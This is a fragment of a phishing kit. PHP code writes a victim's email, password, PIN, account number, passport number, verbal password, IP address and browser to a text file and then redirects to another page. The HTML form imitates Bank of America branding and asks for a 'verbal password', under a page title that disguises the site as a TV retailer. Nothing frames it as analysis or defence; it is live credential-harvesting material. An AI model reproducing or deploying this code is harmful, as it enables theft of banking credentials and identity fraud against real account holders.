...
$archivo = "aljukkyyhhyyyyjjuhuyyyyyyyyyy.txt";
$file = fopen($archivo,"a");
fwrite($file,"Email: ".$email."\r\nClave: ".$cpass."\r\nPIN: ".$pin."\r\nAccount Number: ".$oc1."\r\nNumber Passport: ".$oe2."\r\nVerbal Password: ".$on3."\r\nIP: ".$ip."\r\nNavegador: ".$ip2."\r\n==============================\r\n");
fclose($file);
header ('location: televisor2.php');
...
<title>televisores smart tv|TV y Video: Los más económicos|Mastronics - Mastronics</title>
...
>Enter your configured keyword or verbal password</label
></p>
<input type="password" name="label5654" placeholder="xx-xxxxxxx" required>
</div>
</div>
...
<span class="corporation">© 2022 Bank of America Corporation.</span>
</div>
</div>
</div>
